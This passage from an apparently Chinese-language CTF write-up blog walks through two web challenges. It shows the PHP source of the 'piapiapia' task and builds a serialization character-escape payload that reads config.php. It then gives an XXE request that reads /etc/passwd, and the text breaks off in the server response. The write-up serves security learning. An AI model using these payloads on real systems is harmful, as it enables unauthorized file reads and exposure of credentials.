class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_profile</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $object-&gt;profile;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$new_profile = <span class=\"keyword\">parent</span>::filter($new_profile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mysql</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $link = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span><span class=\"params\">($config)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;link = mysql_connect(</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'hostname'</span>],</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'username'</span>], </span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">\t\t);</span><br><span class=\"line\">\t\tmysql_select_db($config[<span class=\"string\">'database'</span>]);</span><br><span class=\"line\">\t\tmysql_query(<span class=\"string\">\"SET sql_mode='strict_all_tables'\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;link;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select</span><span class=\"params\">($table, $where, $ret = <span class=\"string\">'*'</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"SELECT $ret FROM $table WHERE $where\"</span>;</span><br><span class=\"line\">\t\t$result = mysql_query($sql, <span class=\"keyword\">$this</span>-&gt;link);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_fetch_object($result);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span><span class=\"params\">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class=\"line\">\t\t$key = implode(<span class=\"string\">','</span>, $key_list);</span><br><span class=\"line\">\t\t$value = <span class=\"string\">'\\''</span> . implode(<span class=\"string\">'\\',\\''</span>, $value_list) . <span class=\"string\">'\\''</span>; </span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"INSERT INTO $table ($key) VALUES ($value)\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"UPDATE $table SET $key = '$value' WHERE $where\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> user();</span><br><span class=\"line\">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>\n\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>profile.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\">\tif($profile  == null) &#123;</span><br><span class=\"line\">\t\theader(&apos;Location: update.php&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t$profile = unserialize($profile);</span><br><span class=\"line\">\t\t$phone = $profile[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$email = $profile[&apos;email&apos;];</span><br><span class=\"line\">\t\t$nickname = $profile[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^\\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid phone&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid email&apos;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tif(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid nickname&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[&apos;photo&apos;];</span><br><span class=\"line\">\t\tif($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class=\"line\">\t\t\tdie(&apos;Photo size error&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class=\"line\">\t\t$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">\t\techo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class=\"line\">\t\t\t&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Email:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>profile.php</code> 中找到明显的 </p>\n<p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p>\n<p>读取文件内容，而 <code>flag</code> 放在 <code>config.php</code> 文件中，我们要想办法读这个文件。但是上面读文件的参数限定了 <code>photo</code> ，我们在 <code>update.php</code> 中找到有关代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要 <code>POST</code> 四个参数，并且发现 对 <code>nickname</code> 的过滤与前两个不同，可以使用数组绕过。</p>\n<p>然后对<code>$profile</code> 进行序列化并传入过滤函数进行过滤。我们接着看过滤函数</p>\n <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现从 <code>where</code> -&gt; <code>hacker</code> ,长度增加，联想到之前的反序列化字符逃逸。</p>\n<p>我们在本地实验得到序列化后的字符串是(注意已经将nickname改为数组)</p>\n<p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p>\n<p>我们想读的文件是 <code>config.pgp</code> ,也就是要添加<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,长度为34，也就是说我们要追加 34 个 <code>where</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a:4:&#123;s:5:\"</span>phone<span class=\"string\">\";s:11:\"</span><span class=\"number\">12345678901</span><span class=\"string\">\";s:5:\"</span>email<span class=\"string\">\";s:8:\"</span>ss@q.com<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\"&#125;;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;s:39:\"</span>upload/<span class=\"number\">804</span>f743824c0451b2f60d81b63b6a900<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>之后抓包修改 nickname 为数组，将值改为上面我们构造的内容即可。</p>\n<h2 id=\"real\"><a href=\"#real\" class=\"headerlink\" title=\"real\"></a>real</h2><p>12/19/2019 10:32:05 AM </p>\n<h3 id=\"php-xxe\"><a href=\"#php-xxe\" class=\"headerlink\" title=\"php_xxe\"></a>php_xxe</h3><p>libxml2 2.9.4之前版本，parser.c/xmlStringLenDecodeEntities函数存在XML外部实体漏洞，不在验证模式时，可使上下文独立的攻击者读取任意文件或造成拒绝服务。</p>\n<p>web目录./www包含4个文件：</p>\n<pre><code>$ tree .\n.\n├── dom.php # 示例：使用DOMDocument解析body\n├── index.php\n├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body\n└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</code></pre><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发XXE漏洞</p>\n<p><strong>requests:</strong></p>\n<pre><code>GET /SimpleXMLElement.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nCache-Control: max-age=0\nContent-Length: 163\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>HTTP/1.1 200 OK\nHost: node3.buuoj.cn:26506\nConnection: close\nX-Powered-By: PHP/7.0.30\nContent-type: text/html; 